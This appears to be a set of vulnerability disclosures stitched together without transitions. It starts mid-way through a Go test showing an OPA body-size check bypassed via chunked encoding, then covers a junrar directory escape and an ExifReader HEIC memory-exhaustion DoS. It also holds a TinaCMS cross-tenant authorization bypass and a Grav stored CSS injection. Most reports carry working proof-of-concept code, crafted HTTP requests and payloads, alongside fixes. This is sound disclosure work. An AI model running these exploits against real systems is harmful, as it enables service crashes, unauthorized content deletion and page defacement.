		openpolicyagent.WithInstanceStartupTimeout(5*time.Second),
		openpolicyagent.WithMaxRequestBodyBytes(maxBody),
		openpolicyagent.WithOpenPolicyAgentInstanceConfig(
			openpolicyagent.WithConfigTemplate(config)),
	)
	if err != nil {
		t.Fatalf("opaRegistry: %v", err)
	}
	defer opaRegistry.Close()

	fr := make(filters.Registry)
	fr.Register(opaauthorizerequest.NewOpaAuthorizeRequestWithBodySpec(opaRegistry))
	fr.Register(builtin.NewSetPath())

	docFmt := `r1: * -> opaAuthorizeRequestWithBody("%s") -> "%s";`
	r := eskip.MustParse(fmt.Sprintf(docFmt, bundleName, backend.URL))
	dc := testdataclient.New(r)
	defer dc.Close()

	rt := routing.New(routing.Options{
		FilterRegistry:  fr,
		DataClients:     []routing.DataClient{dc},
		PreProcessors:   []routing.PreProcessor{opaRegistry.NewPreProcessor()},
		PostProcessors:  []routing.PostProcessor{opaRegistry},
		PollTimeout:     time.Second,
		SignalFirstLoad: true,
	})
	defer rt.Close()
	<-rt.FirstLoad()

	pr := proxy.WithParams(proxy.Params{Routing: rt})
	defer pr.Close()
	ts := httptest.NewServer(pr)
	defer ts.Close()

	inst, err := opaRegistry.GetOrStartInstance(bundleName)
	assert.NoError(t, err)
	assert.NotNil(t, inst)

	doReq := func(chunked bool) (int, int64) {
		upstreamBytes.Store(-1)
		req, err := http.NewRequest("POST", ts.URL, strings.NewReader(payload))
		if err != nil {
			t.Fatalf("new request: %v", err)
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		if chunked {
			// Force chunked framing: no Content-Length reaches the server,
			// so the server sees req.ContentLength == -1.
			req.ContentLength = -1
			req.TransferEncoding = []string{"chunked"}
		}
		rsp, err := ts.Client().Do(req)
		if err != nil {
			t.Fatalf("do: %v", err)
		}
		io.Copy(io.Discard, rsp.Body)
		rsp.Body.Close()
		return rsp.StatusCode, upstreamBytes.Load()
	}

	// POSITIVE CONTROL: oversized body WITH Content-Length.
	// truncated_body == true  -> policy denies. Mitigation works as designed.
	clStatus, clUpstream := doReq(false)
	t.Logf("[content-length ] status=%d upstream_body_bytes=%d", clStatus, clUpstream)
	assert.Equal(t, 403, clStatus, "oversized body with Content-Length must be DENIED (mitigation working)")

	// BYPASS: identical oversized body sent CHUNKED (no Content-Length).
	// truncated_body == false -> policy ALLOWS -> full payload reaches upstream.
	chStatus, chUpstream := doReq(true)
	t.Logf("[chunked        ] status=%d upstream_body_bytes=%d", chStatus, chUpstream)

	assert.Equal(t, 200, chStatus, "BYPASS: oversized chunked body was ALLOWED by the truncated_body mitigation")
	assert.Equal(t, int64(len(payload)), chUpstream,
		"BYPASS: upstream received the FULL oversized payload past OPA authorization")
}

```

## Summary

`LocalFolderExtractor` validates only the final canonical file path before extraction. However, `makeFile()` creates intermediate directories one path segment at a time without checking whether each created directory remains inside the destination folder.

A malicious RAR entry can make the final file path resolve inside the extraction destination, while causing intermediate `mkdir()` calls to create attacker-chosen directories outside the extraction root.

This is an extraction root escape via unchecked intermediate directory creation. The default impact is directory creation outside the intended destination, not unconditional arbitrary file content write.

## Affected Code

- `src/main/java/com/github/junrar/LocalFolderExtractor.java`
  - `createFile()` checks only the final canonical path.
  - `makeFile()` calls `dir.mkdir()` for each intermediate segment without containment checks.

Relevant code flow:

```java
private File createFile(final FileHeader fh, final File destination) throws IOException {
    String name = invariantSeparatorsPathString(fh.getFileName());
    File f = new File(destination, name);
    String dirCanonPath = f.getCanonicalPath();
    if (!dirCanonPath.startsWith(destination.getCanonicalPath() + File.separator)) {
        throw new IllegalStateException(...);
    }
    if (!f.exists()) {
        f = makeFile(destination, name);
    }
    return f;
}

private File makeFile(final File destination, final String name) throws IOException {
    final String[] dirs = name.split("/");
    String path = "";
    for (int i = 0; i < dirs.length - 1; i++) {
        path = path + File.separator + dirs[i];
        File dir = new File(destination, path);
        dir.mkdir();
    }
    path = path + File.separator + dirs[dirs.length - 1];
    final File f = new File(destination, path);
    f.createNewFile();
    return f;
}
```

## Impact

An attacker who can supply a malicious RAR archive can create directories outside the intended extraction directory.

This violates the expected extraction boundary and can be used for filesystem pollution or file-vs-directory squatting. For example, an attacker can create a directory at a path where a later security-sensitive file is expected, causing future writes to that path to fail.

## Summary
ExifReader 4.41.0 is vulnerable to denial of service through a crafted HEIC or AVIF file with a malicious `iloc` box. When `offsetSize`, `lengthSize`, and `baseOffsetSize` are set to zero in the iloc header, the extent-parsing loop allocates an unbounded number of JavaScript objects - up to `itemCount × extentCount` (65535 × 65535 = 4.3 billion) - without advancing the buffer offset. A 652-byte file causes 400MB of heap growth; a 6KB file exhausts all system memory and crashes the Node.js process with a JavaScript heap out-of-memory error.

## Affected version tested

- npm package: `exifreader`
- Version: `4.41.0`
- Affected formats: HEIC, AVIF (ISO-BMFF container)

## Root cause

**File:** `src/image-header-iso-bmff-iloc.js`, lines 79–116, function `getItems()`.

The iloc parser reads four size fields from the file (each a 4-bit nibble, valid values 0–15):

| Field | Controls |
|-------|----------|
| `offsetSize` | Bytes per extent offset |
| `lengthSize` | Bytes per extent length |
| `baseOffsetSize` | Bytes per item base offset |
| `indexSize` | Bytes per extent index |

The code then enters a nested loop: for each item (up to 65535), and for each extent within that item (up to 65535), it reads variable-width fields and advances the buffer offset by the corresponding size:

```javascript
for (let j = 0; j < item.extentCount; j++) {
    const extent = {};
    extent.extentIndex = getExtentIndex(dataView, version, offset, indexSize);
    offset += sizes.item.extent.extentIndex;       // 0 when indexSize=0
    extent.extentOffset = getVariableSizedValue(dataView, offset, offsetSize);
    offset += sizes.item.extent.extentOffset;       // 0 when offsetSize=0
    extent.extentLength = getVariableSizedValue(dataView, offset, lengthSize);
    offset += sizes.item.extent.extentLength;       // 0 when lengthSize=0
    item.extents.push(extent);                      // allocates unconditionally
}
```
When all four size fields are zero (a valid value per the ISO-BMFF specification, meaning "field not present"), the buffer offset never advances inside the inner loop. Yet every iteration still pushes a new extensible object onto `item.extents`. There is no iteration cap, no cumulative allocation budget, and no guard that skips the inner loop when all sizes are zero.

## Reproduction

Save the following as `poc_iloc_dos.js` and run with Node.js against the bundled `dist/exif-reader.js`:

```javascript
const fs = require('fs');
const ExifReader = require('../ExifReader-4.41.0/dist/exif-reader.js');

function u32be(n) {
    return [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
}
function u16be(n) {
    return [(n >>> 8) & 255, n & 255];
}
function str(s) {
    return Array.from(Buffer.from(s, 'ascii'));
}
function box(type, content) {
    return [...u32be(8 + content.length), ...str(type), ...content];
}

const ITEMS = 10000;
const EXTENTS = 65535;

const ftyp = box('ftyp', [
    ...str('heic'),
    ...u32be(0),
    ...str('mif1'),
    0, 0, 0, 0,
]);

const ilocPayload = [
    0, 0, 0, 0,
    0, 0,
    ...u16be(ITEMS),
];

for (let i = 0; i < ITEMS; i++) {
    ilocPayload.push(...u16be(i + 1));
    ilocPayload.push(...u16be(0));
    ilocPayload.push(...u16be(EXTENTS));
}

const iloc = box('iloc', ilocPayload);
const meta = box('meta', [0, 0, 0, 0, ...iloc]);
const data = Uint8Array.from([...ftyp, ...meta]);

fs.writeFileSync('/tmp/poc_iloc_dos.heic', data);

console.log(`${data.length} bytes | ${ITEMS} items x ${EXTENTS} extents | ~${((ITEMS * EXTENTS * 80) / (1024 ** 3)).toFixed(0)} GB expected`);

const start = Date.now();
const timeout = setTimeout(() => {
    console.log(`[DoS CONFIRMED] Hung after ${((Date.now() - start) / 1000).toFixed(1)}s`);
    process.exit(1);
}, 30000);

try {
    ExifReader.load(data.buffer);
    clearTimeout(timeout);
    console.log(`Parse completed in ${((Date.now() - start) / 1000).toFixed(1)}s`);
} catch (e) {
    clearTimeout(timeout);
    console.log(`Error: ${e.message}`);
}

```

### Scaled test results
Run the above with different ITEMS values:

| Items | File size | Extent objects | Parse time | Heap growth |
|-------|-----------|---------------|------------|-------------|
| 1 | 58 bytes | 65,535 | 0.03s | +4 MB |
| 5 | 82 bytes | 327,675 | 0.17s | +16 MB |
| 100 | 652 bytes | 6,553,500 | 1.74s | +401 MB |
| 256 | 1,588 bytes | 16,776,960 | ~8s | OOM crash |
| 10000 | 60,052 bytes | 655,350,000 | - | OOM crash (4 GB+) |
<img width="1839" height="588" alt="image" src="https://github.com/user-attachments/assets/cc3bd540-4197-4ada-93c9-3397811a6c02" />


## Expected behavior

A zero-size field is valid per the ISO-BMFF spec (it means the field is not present). The parser should either:
1. Skip the inner extent loop when all extent field sizes are zero and no items need extent data, or
2. Cap the number of extent objects allocated (e.g., a per-item or cumulative budget).

## Security impact

This is a denial-of-service vulnerability. An unauthenticated attacker can craft a ~1 KB HEIC/AVIF image that, when parsed by ExifReader, causes a JavaScript heap out-of-memory crash, aborting the application process. Any web service, desktop application, or mobile app that processes user-uploaded HEIC/AVIF images through ExifReader is affected.

**Note:** The impact is established using ExifReader's existing distributed (`dist/exif-reader.js`) code.

## Suggested fix

In `src/image-header-iso-bmff-iloc.js`, in the `getItems()` function, add a maximum per-item extent limit:

```javascript
const MAX_EXTENTS_PER_ITEM = 10000;

for (let j = 0; j < item.extentCount; j++) {
    if (item.extents.length >= MAX_EXTENTS_PER_ITEM) {
        break;
    }
    // ... existing code ...
}
```

Alternatively (or additionally), skip the inner loop when all extent field sizes are zero:

```javascript
if (sizes.item.extent.extentOffset === 0 && sizes.item.extent.extentLength === 0) {
    // Fields are absent per spec; nothing meaningful to read
    // Still advance offset if extentCount > 0 to maintain correctness
    continue;
}
```

## Summary

`@tinacms/auth`'s `isAuthorized(req)` decides authorization by validating the caller's bearer token against `https://identity.tinajs.io/v2/apps/${req.query.clientID}/currentUser`, where the `clientID` comes from the request and is never compared to the site's own configured TinaCloud app id. The function answers "is this token a verified user of whatever app the caller named?" instead of "is this token a verified user of THIS site?"

Any TinaCloud user can create their own free app, get a valid token for it, and send `?clientID=<their-own-app>` plus `Authorization: <their-own-token>` to a victim self-hosted site. The victim's `authorized` callback runs `const user = await isAuthorized(req); return user && user.verified`, which returns `true`, and the victim authorizes the attacker.

The attacker holds no account on the victim and needs no victim interaction. With the media handlers this grants read, upload, and delete on the victim's media bucket. When the backend uses `TinaCloudBackendAuthProvider()` (the default the `tinacms init` wizard generates for TinaCloud auth), it grants full GraphQL read, write, and delete of the victim's content.

## Affected code (confirmed at `5a6839f`)

`packages/@tinacms/auth/src/index.ts:71-88` reads the `clientID` from the request:

```ts
export const isAuthorized = async (req: NextApiRequest) => {
  const clientID = req.query.clientID;     // attacker-controlled
  const token = req.headers.authorization; // attacker-controlled
  if (typeof clientID === 'string' && typeof token === 'string') {
    return await isUserAuthorized({ clientID, token });
  }
  return undefined;
};
```

`index.ts:16-43` sends that caller-chosen `clientID` straight to the identity server, and returns the user on `200`:

```ts
const tinaCloudRes = await fetch(
  `https://identity.tinajs.io/v2/apps/${clientID}/currentUser`,
  { headers: new Headers({ 'Content-Type': 'application/json', authorization: token }), method: 'GET' }
);
if (tinaCloudRes.ok) { return await tinaCloudRes.json(); }
```

`index.ts:118-135` (`TinaCloudBackendAuthProvider`) gates only on `verified`, which reflects the attacker's own email verification:

```ts
isAuthorized: async (req, _res) => {
  const user = await isAuthorized(req as NextApiRequest);
  if (user && user.verified) return { isAuthorized: true };
  return { isAuthorized: false, errorCode: 401, errorMessage: 'Unauthorized' };
},
```

Every media-store README wires the same gate (`next-tinacms-cloudinary/README.md:113-122`, identical in `s3` and `dos`):

```ts
authorized: async (req, _res) => {
  if (process.env.NEXT_PUBLIC_USE_LOCAL_CLIENT === '1') return true;
  const user = await isAuthorized(req);
  return user && user.verified;   // no clientID === <this site's app> check
}
```

The bug is duplicated in `next-tinacms-azure/src/auth.ts:34-51` (`req.nextUrl.searchParams.get('clientID')`). Downstream nothing pins the site's `clientID`: `@tinacms/datalayer/src/backend/index.ts:201` gates on the boolean, and `next-tinacms-cloudinary/src/handlers.ts:36` returns 401 only when the callback is false. The `tinacms init` TinaCloud path ships this by default (`@tinacms/cli/.../prompts/authProvider.ts:17` -> `TinaCloudBackendAuthProvider()`, used in `templates/tinaNextRoute.tsx:21-24` for every non-local deployment).

## Steps to reproduce (real target)

**Setup:** attacker has one free TinaCloud account with one app (`clientID = ATTACKER_APP`, token `T_attacker`) and no victim account. Victim is any self-hosted TinaCMS site using `@tinacms/auth`.

Media bucket (read; the same gate covers `POST` upload and `DELETE`):

```
GET /api/cloudinary/media?clientID=ATTACKER_APP HTTP/1.1
Host: victim.example
Authorization: T_attacker
```

Content backend, when `TinaCloudBackendAuthProvider` is used:

```
POST /api/tina/gql?clientID=ATTACKER_APP HTTP/1.1
Host: victim.example
Authorization: T_attacker
Content-Type: application/json

{"query":"mutation($c:String!,$r:String!){deleteDocument(collection:$c,relativePath:$r){__typename}}","variables":{"c":"post","r":"hello.md"}}
```

**Expected:** 401/403 for a user with no access to `victim.example`.
**Actual:** 200, because authorization is bound to the attacker-supplied `clientID`.

## Proof of concept (self-contained, zero dependencies)

Save the file below as `poc.js` and run `node poc.js` (Node >= 18). It runs the package's own `isAuthorized` / `isUserAuthorized` (TypeScript types removed; the hard-coded `identity.tinajs.io` base read from an env var so it points at a local identity model) behind the verbatim media-store `authorized` callback. The identity model scopes tokens to apps correctly and is not itself vulnerable; the bug is that the victim lets the caller choose which app to validate against.

```js
/**
 * Self-contained PoC — @tinacms/auth cross-tenant authorization bypass
 * Audited commit: 5a6839f95ca60d1b9f4032a3bed1ae4a338a4787 (@tinacms/auth 1.1.3)
 *
 * Zero dependencies. Run with:  node poc.js   (Node >= 18 for global fetch)
 *
 * The two functions below are copied from packages/@tinacms/auth/src/index.ts.
 * The ONLY changes are: TypeScript types removed, and the hard-coded
 * https://identity.tinajs.io base read from IDENTITY_BASE so it can point at the
 * local identity model. req.query.clientID, the currentUser call, and the
 * `user && user.verified` gate are byte-for-byte the original logic.
 */

const http = require('http');

const IDENTITY_PORT = 18099;
const VICTIM_PORT = 19090;
process.env.IDENTITY_BASE = `http://127.0.0.1:${IDENTITY_PORT}`;

/* ===== verbatim from @tinacms/auth/src/index.ts (types stripped) ===== */

const isUserAuthorized = async (args) => {
  const clientID = args.clientID;
  const token = args.token;
  try {
    const tinaCloudRes = await fetch(
      `${process.env.IDENTITY_BASE || 'https://identity.tinajs.io'}/v2/apps/${clientID}/currentUser`,
      {
        headers: new Headers({ 'Content-Type': 'application/json', authorization: token }),
        method: 'GET',
      }
    );
    if (tinaCloudRes.ok) {
      const user = await tinaCloudRes.json();
      return user;
    }
    return;
  } catch (e) {
    console.error(e);
    throw e;
  }
};

const isAuthorized = async (req) => {
  const clientID = req.query.clientID;       // <-- attacker-controlled
  const token = req.headers.authorization;   // <-- attacker-controlled
  if (typeof clientID === 'string' && typeof token === 'string') {
    return await isUserAuthorized({ clientID, token });
  }
  return undefined;
};

/* ===== identity model: a token grants access to the app its owner owns =====
   This is NOT the vulnerable part. It scopes tokens to apps correctly. The bug
   is that the victim lets the caller choose which app to validate against.     */

const TOKEN_FOR = {
  'victim-app': 'valid-token-for-victim-app',
  'attacker-app': 'valid-token-for-attacker-app',
};
const USER_FOR = {
  'victim-app': { id: 'u-victim', email: 'owner@victim.example', verified: true, role: 'admin' },
  'attacker-app': { id: 'u-attacker', email: 'attacker@evil.example', verified: true, role: 'admin' },
};
const identity = http.createServer((req, res) => {
  const m = req.url.match(/^\/v2\/apps\/([^/]+)\/currentUser$/);
  if (!m) { res.writeHead(404); return res.end('nf'); }
  const app = decodeURIComponent(m[1]);
  if (TOKEN_FOR[app] && req.headers['authorization'] === TOKEN_FOR[app]) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify(USER_FOR[app]));
  }
  res.writeHead(401, { 'Content-Type': 'application/json' });
  return res.end(JSON.stringify({ message: 'unauthorized for this app' }));
});

/* ===== victim site (own clientID = victim-app), verbatim media-store README callback ===== */

const authorized = async (req) => {
  const user = await isAuthorized(req);
  return user && user.verified;             // never checks req.query.clientID === victim-app
};
const victim = http.createServer(async (req, res) => {
  const u = new URL(req.url, `http://127.0.0.1:${VICTIM_PORT}`);
  req.query = Object.fromEntries(u.searchParams.entries());
  if (!u.pathname.startsWith('/api/cloudinary/media')) { res.writeHead(404); return res.end('nf'); }
  if (!(await authorized(req))) {
    res.writeHead(401, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ message: 'sorry this user is unauthorized' }));
  }
  res.writeHead(200, { 'Content-Type': 'application/json' });
  return res.end(JSON.stringify({ authorized: true, site: 'victim-app',
    media: ['victim/private/contract.pdf', 'victim/private/customers.csv'] }));
});

/* ===== driver ===== */

function call(clientID, token) {
  return new Promise((resolve) => {
    const r = http.request({ host: '127.0.0.1', port: VICTIM_PORT,
      path: `/api/cloudinary/media?clientID=${encodeURIComponent(clientID)}`,
      method: 'GET', headers: { authorization: token } }, (res) => {
      let b = ''; res.on('data', (c) => (b += c));
      res.on('end', () => resolve({ status: res.statusCode, body: b }));
    });
    r.on('error', (e) => resolve({ status: 0, body: String(e) })); r.end();
  });
}

(async () => {
  await new Promise((r) => identity.listen(IDENTITY_PORT, '127.0.0.1', r));
  await new Promise((r) => victim.listen(VICTIM_PORT, '127.0.0.1', r));

  const c1 = await call('victim-app', 'valid-token-for-victim-app');
  console.log('[CONTROL 1  legit victim user      ] clientID=victim-app   token=victim   ->', c1.status, c1.body);

  const c2 = await call('victim-app', 'valid-token-for-attacker-app');
  console.log('[CONTROL 2  attacker token, victim ] clientID=victim-app   token=attacker ->', c2.status, c2.body);

  const atk = await call('attacker-app', 'valid-token-for-attacker-app');
  console.log('[ATTACK     attacker own app+token ] clientID=attacker-app token=attacker ->', atk.status, atk.body);

  const bug = c1.status === 200 && c2.status === 401 && atk.status === 200;
  console.log('\nVERDICT:', bug
    ? 'VULNERABLE — attacker authorized on victim site with credentials only for their own app.'
    : 'NOT REPRODUCED');
  identity.close(); victim.close();
  process.exit(bug ? 0 : 1);
})();
```

Output:

```
[CONTROL 1  legit victim user      ] clientID=victim-app   token=victim   -> 200 {"authorized":true,"site":"victim-app","media":[...]}
[CONTROL 2  attacker token, victim ] clientID=victim-app   token=attacker -> 401 {"message":"sorry this user is unauthorized"}
[ATTACK     attacker own app+token ] clientID=attacker-app token=attacker -> 200 {"authorized":true,"site":"victim-app","media":[...]}

VERDICT: VULNERABLE - attacker authorized on victim site with credentials only for their own app.
```

CONTROL 1 (200) shows the identity model is faithful, not a blanket allow. CONTROL 2 (401) shows the attacker cannot reach the victim's app with their own token. ATTACK (200) shows that naming their own app id, which their own token matches, passes the victim's gate and returns the victim's private media.

I verified the full chain in source at the audited commit and reproduced the code logic deterministically with the PoC above. I did not run the end-to-end attack against production `identity.tinajs.io` with two real accounts and a live deployment; that step needs two real accounts and a deployment. The one assumption it rests on, that `GET /v2/apps/<attacker-app>/currentUser` with the attacker's own token returns `200` + `verified:true`, is the normal behavior of an app owner's own session.

## Impact

An attacker with a free TinaCloud account reaches editor-level control of unrelated tenants:

- **Media handlers:** list and read media, upload arbitrary objects (`next-tinacms-dos` writes `ACL: public-read`, usable to host malware or phishing under the victim's CDN), and delete media by key.
- **`TinaCloudBackendAuthProvider` backend:** arbitrary GraphQL. Read every document, `createDocument` / `updateDocument` to deface or inject content that deploys to production, and `deleteDocument` to destroy content.
The attacker scripts requests with their own token and `clientID=<own app>` against known TinaCMS self-hosted endpoints, so it scales across deployments.

## Fix

Bind the decision to the site's own configured app id instead of the request value.

```diff
- export const isAuthorized = async (req: NextApiRequest) => {
-   const clientID = req.query.clientID;
-   const token = req.headers.authorization;
+ export const isAuthorized = async (req: NextApiRequest, expectedClientID?: string) => {
+   const requestClientID = req.query.clientID;
+   const token = req.headers.authorization;
+   const clientID = expectedClientID ?? process.env.NEXT_PUBLIC_TINA_CLIENT_ID;
+   if (expectedClientID && requestClientID && requestClientID !== expectedClientID) {
+     return undefined; // refuse a cross-tenant clientID
+   }
    if (typeof clientID === 'string' && typeof token === 'string') {
      return await isUserAuthorized({ clientID, token });
    }
    return undefined;
  };
```

Thread the site's configured `clientID` into `TinaCloudBackendAuthProvider()` and the media handler config, require `isUserAuthorized` to use it rather than `req.query.clientID`, apply the same change to `next-tinacms-azure/src/auth.ts`, and update the media-store READMEs so integrators stop reintroducing the request-driven `clientID`.

## Summary

Grav 2.0.0-rc.9 and the current 2.0 branch still allow stored CSS injection through Markdown image media actions. The prior media hardening rejects direct `?style=` payloads and unsafe `attribute()` fallbacks, but the adjacent `resize()` action still writes caller-controlled values directly into `styleAttributes`.

A publisher who can edit page Markdown can store a crafted image URL that renders additional CSS declarations in the final `<img style=...>` attribute. This crosses the same lower-privileged publisher to higher-privileged reviewer/admin rendered-content boundary as the earlier media style and attribute advisories.

## Impact

A lower-privileged content editor can persist CSS declarations that are rendered when a higher-privileged user views the page or admin preview. The demonstrated payload creates a full-viewport fixed overlay by injecting `position:fixed`, viewport dimensions, background color, and z-index declarations.

This does not require JavaScript execution. The impact is stored CSS injection in rendered content, with UI redress/overlay and content-manipulation risk in higher-privileged sessions.

## Reproduction

Tested versions:

- Grav 2.0 branch commit `6582166173bb8eb5869d96aea384e0e73777c94c`
- Grav `2.0.0-rc.9` commit `e03d29aa0d3ece16d73c1ffccfa78df8bf5f28b8`

Minimal Markdown payload:

```markdown
![logo](image.png?resize=100;position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999,200)
```

A minimal PHPUnit-style reproducer can drive the same parser path directly:

```php
$m = new class {
    use \Grav\Common\Media\Traits\MediaObjectTrait;
    use \Grav\Common\Media\Traits\StaticResizeTrait;

    public function addMetaFile($filepath) {}
    public function __toString(): string { return ''; }
    public function url($reset = true) { return '/img.png'; }
    public function get($name, mixed $default = null, $separator = null) { return $default; }
    public function set($name, mixed $value, $separator = null) { return $this; }
    protected function createThumbnail($thumb) { return null; }
    protected function createLink(array $attributes) { return null; }
    protected function getItems(): array { return []; }
};

$excerpts = new \Grav\Common\Page\Markdown\Excerpts(null, ['markdown' => [], 'images' => []]);
$m = $excerpts->processMediaActions(
    $m,
    'image.png?resize=100;position:fixed;top:0;left:0;width:100vw;height:100vh;background:white;z-index:9999,200'
);
$element = $m->parsedownElement('', '', '', '', false);
var_dump($element['attributes']['style']);
